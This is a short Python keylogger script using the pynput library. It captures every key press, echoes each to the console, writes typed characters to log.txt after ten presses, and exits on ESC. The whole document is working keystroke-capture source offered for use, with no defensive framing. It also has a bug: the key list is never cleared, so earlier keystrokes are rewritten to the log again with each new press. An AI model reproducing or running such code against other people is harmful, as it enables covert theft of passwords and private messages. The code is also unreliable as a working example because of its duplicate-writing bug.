import pynput
from pynput.keyboard import Key, Listener


class Keylogger:

    def __init__(self):
        self.count = 0
        self.key = []

    def on_press(self, key):
        print(f"{key} pressed")

        self.key.append(key)
        self.count+=1

        if self.count >=10:
            self.write_file(self.key)

    def on_release(self, key):#закрытие програмы на кнопку ESC
        if key == Key.esc:
            return False


    def write_file(self, key):
        with open('log.txt','a') as file:
            for key in self.key:
                k = str(key).replace("'",'')

                if k.find("space")>0:
                    file.write("\n")
                elif k.find("Key") == -1:
                    file.write(k)


if __name__ == "__main__":
    obj = Keylogger()
    with Listener(on_press=obj.on_press, on_release=obj.on_release) as listener:
        listener.join()
